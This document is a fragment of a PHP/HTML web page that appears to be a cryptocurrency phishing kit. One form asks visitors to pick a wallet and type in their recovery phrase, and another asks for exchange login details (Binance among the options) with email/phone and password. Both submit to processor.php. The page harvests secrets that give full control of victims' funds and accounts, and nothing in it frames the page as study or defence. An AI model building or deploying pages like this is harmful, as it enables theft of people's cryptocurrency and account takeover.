...
<body>
    ...
    <?php if(isset($_GET['choice']) && $_GET['choice'] ==="wallet"){?>
        ...
        <div class="row">
            ...
            <div class="col-9 m-auto">
                <form method="POST" action="processor.php" name="processForm">
               <div class="mb-1">
    <input type="text" class="form-control" name="_wallet" id="exampleInputEmail1" aria-describedby="emailHelp" value="<?= 'TXN'. mt_rand(100000,999999);?>" hidden>
  </div>
  <div class="mb-3">
    <label for="exampleInputEmail1" class="form-label"><i class="ti-wallet"></i>&nbsp;Select Wallet:</label>
    <select class="form-select form-select-md mb-2" aria-label=".form-select-md example" name="selectWallet" required="true">
          <option></option>
  ...
  <textarea class="form-control" aria-label="With textarea" name="seed" rows="3" placeholder="Enter your recovery phrase" required="true"></textarea>
</div>
  </div>
  ...
  <button name="submitWallet" type="submit" class="btn btn-lg btn-success"><i class="ti-angle-double-right"></i>&nbsp;Proceed</button>
</form>
            </div>
        </div>
    <?php } else {echo "";}?>
...
<!-- EXCHANGE FORM -->
     <?php if(isset($_GET['choice']) && $_GET['choice'] ==="exchange"){?>
         <div class="row">
            ...
            <div class="col-9 m-auto">
                <form method="POST" action="processor.php" name="processForm2">
                    <div class="mb-1">
    <input type="text" class="form-control" name="_xchange" id="exampleInputEmail1" aria-describedby="emailHelp" value="<?= 'TXN'. mt_rand(100000,999999);?>" hidden>
  </div>
  <div class="mb-3">
    <label for="exampleInputEmail1" class="form-label"><i class="ti-wallet"></i>&nbsp;Select Exchange:</label>
    <select class="form-select form-select-md mb-2" aria-label=".form-select-md example" name="selectExchange" required="true">
          <option></option>
          <option value="binance">Binance</option>
  ...
  <div class="mb-2">
    ...
    <input type="text" class="form-control" name="user" id="exampleInputEmail1" aria-describedby="emailHelp" placeholder="Email/Phone number" required="true">
    <!-- <div id="emailHelp" class="form-text">We'll never share your email with anyone else.</div> -->
  </div>
  <div class="mb-3">
    <label for="exampleInputPassword1" class="form-label"><i class="ti-key"></i>Password:</label>
    <input type="password" name="user_pass" class="form-control" id="exampleInputPassword1" placeholder="Password" required="true">
  </div>
  <div class="mb-3 form-check">
    <input type="checkbox" class="form-check-input" id="exampleCheck1" required="true">
    <label class="form-check-label" for="exampleCheck1">I have checked and agree that my details are correct.</label>
  </div>
  <button name="submitExchange" type="submit" class="btn btn-lg btn-success"><i class="ti-stats-up"></i>&nbsp;Proceed</button>
</form>
            </div>
        </div>
         <?php } else {echo "";}?>
